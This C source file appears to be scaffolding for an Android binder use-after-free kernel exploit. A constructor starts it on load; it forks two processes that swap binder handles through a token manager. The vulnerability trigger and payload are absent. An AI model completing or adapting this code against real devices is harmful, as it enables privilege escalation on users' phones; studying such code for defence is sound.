#include "binder_client.h"
#define _GNU_SOURCE
#include <unistd.h>
#include <stdio.h>
#include <fcntl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <string.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sched.h>
#include <sys/time.h>
#include <sys/resource.h>
#include <sys/epoll.h>
#include <sys/uio.h>
#include <limits.h>
#include <sys/eventfd.h>
#include <sys/timerfd.h>
#include <assert.h>
#include <sys/xattr.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <errno.h>
#include <sys/prctl.h>
#include <sys/sendfile.h>
#include <linux/fs.h>
#include <stdlib.h>
#include <pthread.h>
#include "binder.h"
#include "exploit.h"
#include "util.h"
#include "token_manager.h"

typedef struct {
    pthread_barrier_t token_register_barrier;
    struct token a_token;
    struct token b_token;
} ExploitCtx;

void init_shared_barrier(pthread_barrier_t *b, int count) {
    pthread_barrierattr_t attr;
    pthread_barrierattr_init(&attr);
    pthread_barrierattr_setpshared(&attr, PTHREAD_PROCESS_SHARED);
    pthread_barrier_init(b, &attr, count);
}

void exploit_ctx_init(ExploitCtx *ctx) {
    memset(ctx, 0, sizeof(ExploitCtx));
    init_shared_barrier(&ctx->token_register_barrier, 2);
}

typedef struct {
    ExploitCtx *ctx;
    // handle ref to other process binder node
    u32 remote_handle;
    // node we use to receive messages
    binder_uintptr_t local_node;
} LocalCtx;

#undef PAGE_SIZE
#define PAGE_SIZE (0x1000)

#define PROCESS_A_BINDER 20
#define PROCESS_B_BINDER 40

void process_b(ExploitCtx *ctx) {
    pin_to_cpu(0);

    binder_client_t binder = { 0 };
    binder_client_init(&binder, NULL);

    LOG("Binder context created");

    u32 token_manager_handle = -1;
    int ret = find_token_manager(binder.fd, &token_manager_handle);
    if (ret < 0) {
        LOG("Failed to find token manager");
        return;
    }

    LOGD("Token manager found");

    ret = token_manager_register(
        binder.fd,
        token_manager_handle,
        PROCESS_B_BINDER,
        0,
        &ctx->b_token
    );
    if (ret < 0) {
        LOG("Failed to register binder node with token manager");
        return;
    }

    LOGD("Binder node registered in token manager");

    // wait for both process to register with token barrier
    pthread_barrier_wait(&ctx->token_register_barrier);

    u32 a_handle = 0;
    ret = token_manager_lookup(
        binder.fd,
        token_manager_handle,
        &ctx->a_token,
        &a_handle
    );

    if (ret < 0) {
        LOG("Failed to lookup binder handle to b from token manager");
        return;
    }

    LOGD("Got a handle: %u", a_handle);

    LocalCtx local_ctx = {
        .ctx = ctx,
        .remote_handle = a_handle,
        .local_node = PROCESS_B_BINDER,
    };
}

void process_a(ExploitCtx *ctx) {
    pin_to_cpu(0);

    binder_client_t binder = { 0 };
    binder_client_init(&binder, NULL);

    LOG("Binder context created");

    u32 token_manager_handle = -1;
    int ret = find_token_manager(binder.fd, &token_manager_handle);
    if (ret < 0) {
        LOG("Failed to find token manager");
        return;
    }

    LOGD("Token manager found");

    ret = token_manager_register(
        binder.fd,
        token_manager_handle,
        PROCESS_A_BINDER,
        0,
        &ctx->a_token
    );
    if (ret < 0) {
        LOG("Failed to register binder node with token manager");
        return;
    }

    LOGD("Binder node registered in token manager");

    // wait for both process to register with token barrier
    pthread_barrier_wait(&ctx->token_register_barrier);

    u32 b_handle = 0;
    ret = token_manager_lookup(
        binder.fd,
        token_manager_handle,
        &ctx->b_token,
        &b_handle
    );

    if (ret < 0) {
        LOG("Failed to lookup binder handle to b from token manager");
        return;
    }

    LOGD("Got b handle: %u", b_handle);

    LocalCtx local_ctx = {
        .ctx = ctx,
        .remote_handle = b_handle,
        .local_node = PROCESS_A_BINDER,
    };
}

void exploit() {
    // exploit context should be in shared memory
    ExploitCtx *ctx = SYSCHK(mmap(NULL, sizeof(ExploitCtx), PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_SHARED, -1, 0));;

    exploit_ctx_init(ctx);

    if (SYSCHK(fork()) == 0) {
        // process B executes vuln to get UAF values in process A
        process_b(ctx);
    } else {
        // process A instructs process b to do vuln, then performs rest of exploit
        process_a(ctx);
    }
}

static void init() __attribute__((constructor));
void init() {
    unsetenv("LD_PRELOAD");
    puts("Starting exploit...");
    exploit();
}